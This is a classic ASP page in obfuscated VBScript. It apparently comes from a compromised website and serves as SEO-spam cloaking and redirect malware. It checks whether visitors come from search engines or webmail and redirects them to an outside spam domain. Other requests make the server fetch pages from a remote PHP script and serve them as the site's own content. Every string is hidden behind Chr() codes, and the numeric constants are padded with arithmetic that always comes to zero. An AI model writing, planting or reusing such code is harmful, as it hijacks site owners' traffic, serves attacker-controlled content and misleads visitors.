<%
Public G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6
Public G6Z2G6Z2G6Z2G6Z2G6G6G6G6Z2
Public G6G6G6G6Z2G6G6G6Z2G6G6G6
Public G6Z2G6G6G6Z2Z2Z2G6G6Z2G6
Public G6Z2G6Z2G6G6Z2G6Z2G6G6Z2
    G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 = CStr ( Request.ServerVariables ( Chr ( 72 ) & Chr ( 84 ) & Chr ( 84 ) & Chr ( 80 ) & Chr ( 95 ) & Chr ( 82 ) & Chr ( 69 ) & Chr ( 70 ) & Chr ( 69 ) & Chr ( 82 ) & Chr ( 69 ) & Chr ( 82 ) ) )  
    G6Z2G6Z2G6Z2G6Z2G6G6G6G6Z2 = lcase ( Request.ServerVariables ( Chr ( 72 ) & Chr ( 84 ) & Chr ( 84 ) & Chr ( 80 ) & Chr ( 95 ) & Chr ( 72 ) & Chr ( 79 ) & Chr ( 83 ) & Chr ( 84 ) ) )  
    If InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 98 ) & Chr ( 97 ) & Chr ( 105 ) & Chr ( 100 ) & Chr ( 117 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) ) > ( 1 * 86 - 86 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 117 ) & Chr ( 114 ) & Chr ( 108 ) & Chr ( 63 ) ) > ( 78 * 0 - 0 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 121 ) & Chr ( 97 ) & Chr ( 104 ) & Chr ( 111 ) & Chr ( 111 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) ) > ( 33 * 62 - 2046 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 97 ) & Chr ( 115 ) & Chr ( 107 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) ) > ( 3 * 79 - 237 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 98 ) & Chr ( 105 ) & Chr ( 110 ) & Chr ( 103 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) ) > ( 97 * 43 - 4171 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 121 ) & Chr ( 97 ) & Chr ( 110 ) & Chr ( 100 ) & Chr ( 101 ) & Chr ( 120 ) & Chr ( 46 ) & Chr ( 114 ) & Chr ( 117 ) ) > ( 83 * 40 - 3320 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 110 ) & Chr ( 97 ) & Chr ( 118 ) & Chr ( 101 ) & Chr ( 114 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) ) > ( 43 * 6 - 258 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 112 ) & Chr ( 101 ) & Chr ( 101 ) & Chr ( 112 ) & Chr ( 108 ) & Chr ( 111 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) ) > ( 44 * 55 - 2420 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 109 ) & Chr ( 121 ) & Chr ( 119 ) & Chr ( 101 ) & Chr ( 98 ) & Chr ( 115 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 114 ) & Chr ( 99 ) & Chr ( 104 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) ) > ( 71 * 50 - 3550 ) Or InStr ( G6G6Z2G6Z2G6Z2G6Z2Z2Z2Z2G6 , Chr ( 109 ) & Chr ( 97 ) & Chr ( 105 ) & Chr ( 108 ) & Chr ( 46 ) ) > ( 11 * 28 - 308 ) Then 
        Response.Redirect Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 109 ) & Chr ( 99 ) & Chr ( 46 ) & Chr ( 117 ) & Chr ( 115 ) & Chr ( 46 ) & Chr ( 50 ) & Chr ( 114 ) & Chr ( 50 ) & Chr ( 50 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) & Chr ( 63 ) & G6Z2G6Z2G6Z2G6Z2G6G6G6G6Z2 &   ""  
        Response.End 
    End If 
    Response.Write vbCrLf 
    On Error Resume Next 
    G6G6G6G6Z2G6G6G6Z2G6G6G6 = Request.QueryString ( Chr ( 99 ) & Chr ( 104 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 112 ) & Chr ( 105 ) & Chr ( 100 ) )  
    G6Z2G6G6G6Z2Z2Z2G6G6Z2G6 = Request.QueryString ( Chr ( 112 ) & Chr ( 97 ) & Chr ( 103 ) & Chr ( 101 ) )  
    If Request ( Chr ( 99 ) & Chr ( 104 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 112 ) & Chr ( 105 ) & Chr ( 100 ) ) <>   "" Then G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 = G6Z2Z2G6Z2G6G6Z2G6G6Z2Z2G6G6 ( Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Chr ( 121 ) & Chr ( 107 ) & Chr ( 117 ) & Chr ( 115 ) & Chr ( 46 ) & Chr ( 50 ) & Chr ( 120 ) & Chr ( 56 ) & Chr ( 56 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) & Chr ( 47 ) & Chr ( 109 ) & Chr ( 99 ) & Chr ( 113 ) & Chr ( 117 ) & Chr ( 101 ) & Chr ( 101 ) & Chr ( 110 ) & Chr ( 47 ) & Chr ( 48 ) & Chr ( 55 ) & Chr ( 50 ) & Chr ( 50 ) & Chr ( 46 ) & Chr ( 112 ) & Chr ( 104 ) & Chr ( 112 ) & Chr ( 63 ) & Chr ( 99 ) & Chr ( 104 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 112 ) & Chr ( 105 ) & Chr ( 100 ) & Chr ( 61 ) & G6G6G6G6Z2G6G6G6Z2G6G6G6 & Chr ( 38 ) & Chr ( 112 ) & Chr ( 97 ) & Chr ( 103 ) & Chr ( 101 ) & Chr ( 61 ) & G6Z2G6G6G6Z2Z2Z2G6G6Z2G6 &   "" )  
    If Request ( Chr ( 99 ) & Chr ( 104 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 112 ) & Chr ( 105 ) & Chr ( 100 ) ) =   "" And Request ( Chr ( 112 ) & Chr ( 97 ) & Chr ( 103 ) & Chr ( 101 ) ) =   "" Then G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 = G6Z2Z2G6Z2G6G6Z2G6G6Z2Z2G6G6 ( Chr ( 104 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 58 ) & Chr ( 47 ) & Chr ( 47 ) & Request.ServerVariables ( Chr ( 72 ) & Chr ( 84 ) & Chr ( 84 ) & Chr ( 80 ) & Chr ( 95 ) & Chr ( 72 ) & Chr ( 79 ) & Chr ( 83 ) & Chr ( 84 ) ) & Chr ( 47 ) )  
    G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 = replace ( G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 , Chr ( 48 ) & Chr ( 55 ) & Chr ( 50 ) & Chr ( 50 ) & Chr ( 46 ) & Chr ( 112 ) & Chr ( 104 ) & Chr ( 112 ) & Chr ( 63 ) , Chr ( 63 ) )  
    G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 = replace ( G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 , Chr ( 48 ) & Chr ( 55 ) & Chr ( 50 ) & Chr ( 50 ) & Chr ( 46 ) & Chr ( 112 ) & Chr ( 104 ) & Chr ( 112 ) , Request.ServerVariables ( Chr ( 115 ) & Chr ( 99 ) & Chr ( 114 ) & Chr ( 105 ) & Chr ( 112 ) & Chr ( 116 ) & Chr ( 95 ) & Chr ( 110 ) & Chr ( 97 ) & Chr ( 109 ) & Chr ( 101 ) ) )  
    G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 = replace ( G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 , Chr ( 116 ) & Chr ( 119 ) & Chr ( 105 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 101 ) & Chr ( 114 ) & Chr ( 46 ) & Chr ( 99 ) & Chr ( 111 ) & Chr ( 109 ) , Request.ServerVariables ( Chr ( 72 ) & Chr ( 116 ) & Chr ( 116 ) & Chr ( 112 ) & Chr ( 95 ) & Chr ( 72 ) & Chr ( 111 ) & Chr ( 115 ) & Chr ( 116 ) ) )  
    Response.Write G6Z2G6Z2G6G6Z2G6Z2G6G6Z2 
    Response.Write vbCrLf 
Function G6Z2Z2G6Z2G6G6Z2G6G6Z2Z2G6G6(G6Z2Z2Z2Z2G6Z2Z2Z2G6G6G6Z2Z2 )
    Dim G6G6G6G6G6Z2G6Z2Z2Z2G6
    Set G6G6G6G6G6Z2G6Z2Z2Z2G6 = Server.CreateObject ( Chr ( 77 ) & Chr ( 115 ) & Chr ( 120 ) & Chr ( 109 ) & Chr ( 108 ) & Chr ( 50 ) & Chr ( 46 ) & Chr ( 88 ) & Chr ( 77 ) & Chr ( 76 ) & Chr ( 72 ) & Chr ( 84 ) & Chr ( 84 ) & Chr ( 80 ) )  
    G6G6G6G6G6Z2G6Z2Z2Z2G6.Open Chr ( 71 ) & Chr ( 69 ) & Chr ( 84 ) , G6Z2Z2Z2Z2G6Z2Z2Z2G6G6G6Z2Z2 , False 
    G6G6G6G6G6Z2G6Z2Z2Z2G6.send 
    If G6G6G6G6G6Z2G6Z2Z2Z2G6.readyState <> ( 29 * 26 - 750 ) Then Exit Function 
    G6Z2Z2G6Z2G6G6Z2G6G6Z2Z2G6G6 = G6Z2Z2G6G6Z2G6G6G6G6G6G6G6G6 ( G6G6G6G6G6Z2G6Z2Z2Z2G6.responseBody )  
    Set G6G6G6G6G6Z2G6Z2Z2Z2G6 = Nothing 
End Function
Function G6Z2Z2G6G6Z2G6G6G6G6G6G6G6G6(G6Z2Z2Z2Z2G6G6G6G6 )
    Dim G6Z2G6Z2G6G6G6G6G6G6Z2
    Dim G6Z2G6Z2Z2G6Z2Z2G6Z2
    Set G6Z2G6Z2G6G6G6G6G6G6Z2 = Server.CreateObject ( Chr ( 65 ) & Chr ( 68 ) & Chr ( 79 ) & Chr ( 68 ) & Chr ( 66 ) & Chr ( 46 ) & Chr ( 83 ) & Chr ( 116 ) & Chr ( 114 ) & Chr ( 101 ) & Chr ( 97 ) & Chr ( 109 ) )  
    G6Z2G6Z2G6G6G6G6G6G6Z2.Type = ( 91 * 36 - 3274 )  
    G6Z2G6Z2G6G6G6G6G6G6Z2.Open 
    G6Z2G6Z2G6G6G6G6G6G6Z2.WriteText G6Z2Z2Z2Z2G6G6G6G6 
    G6Z2G6Z2G6G6G6G6G6G6Z2.Position = ( 21 * 35 - 735 )  
    G6Z2G6Z2G6G6G6G6G6G6Z2.Charset = Chr ( 117 ) & Chr ( 116 ) & Chr ( 102 ) & Chr ( 45 ) & Chr ( 56 )  
    G6Z2G6Z2G6G6G6G6G6G6Z2.Position = ( 93 * 18 - 1672 )  
    G6Z2G6Z2Z2G6Z2Z2G6Z2 = G6Z2G6Z2G6G6G6G6G6G6Z2.ReadText 
    G6Z2G6Z2G6G6G6G6G6G6Z2.Close 
    Set G6Z2G6Z2G6G6G6G6G6G6Z2 = Nothing 
    G6Z2Z2G6G6Z2G6G6G6G6G6G6G6G6 = G6Z2G6Z2Z2G6Z2Z2G6Z2 
End Function

%>
